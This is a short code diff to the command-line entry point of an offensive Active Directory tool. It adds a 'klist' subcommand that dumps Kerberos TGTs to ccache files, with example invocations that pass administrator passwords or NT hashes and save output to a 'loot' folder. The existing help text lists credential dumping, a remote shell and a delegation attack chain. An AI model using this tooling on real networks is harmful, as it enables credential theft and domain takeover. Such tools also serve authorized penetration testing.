@@ -10,6 +10,7 @@ Subcommands:
   dump   Dump SAM, LSA, DCC2, NTDS, DPAPI credentials (secretsdump-style)
   shell  Interactive WMI+SMB shell (evil-winrm-style)
   rbcd   Resource-Based Constrained Delegation attack chain
+  klist  Dump all Kerberos TGTs → MIT ccache files (requires Tsch binary)
 
 Run  titan <subcommand> -h  for per-subcommand help.
 
@@ -21,6 +22,9 @@ Quick examples:
 
   titan shell ECORP/Administrator:'P@ss'@192.168.15.42
   titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40
+
+  titan klist ECORP/Administrator:'P@ss'@192.168.15.42
+  titan klist -u Administrator -d ECORP --hash :NThash -t 192.168.15.42 -o ./loot/
 """
 
 import os
@@ -48,6 +52,9 @@ def main():
         _m()
     elif sub == 'rbcd':
         from titanlib.rbcd import main as _m
+        _m()
+    elif sub == 'klist':
+        from titanlib.klist import main as _m
         _m()
     else:
         print(f'[!] Unknown subcommand: {sub!r}\n', file=sys.stderr)
